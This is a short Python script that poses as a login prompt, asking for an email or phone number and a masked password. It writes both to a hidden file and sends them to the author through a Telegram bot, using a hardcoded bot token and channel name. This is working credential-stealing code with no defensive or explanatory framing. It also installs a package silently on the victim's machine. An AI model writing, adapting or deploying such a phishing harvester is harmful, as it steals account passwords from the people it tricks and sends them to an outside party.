import requests
import sys
import os
try:
  import pwinput
except ImportError:
    os.system('pip install pwinput')
from pwinput import pwinput
def email():
 sxz = input("YOUR EMAIL or NUMBER  : ")
 if len(sxz)<=9:
    print("ERROR EMAIL")
    email()
 elif "@" in sxz:
    pass
 elif "092" in sxz :
     pass
 elif "091" in sxz:
   pass
 else:
    
    email()
 zeyad2 = pwinput("YOUR PASSWORD :","#")
 open('.em.txt','w').write("EMAIL = "+sxz+"\n"+"PASSWORD : "+zeyad2)
 if len(zeyad2)<=5:
    print("PASSWORD ERROR")
    email()
email()
token = '5560554289:AAEfYUISm3NCfOcRTbjRkKtXkA7Sf10K-_s'
groupId = 'nsnasaksak'
msg = open('.em.txt','r').read() 
message = f'يا زامل '
def sendMsg(message):
 url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id=@{groupId}&text={message}'
 res = requests.get(url)
 if res.status_code==200:
    print('loading')
 else:
    print('SOME ERROR HERE')
    sys.exit()
sendMsg(msg)
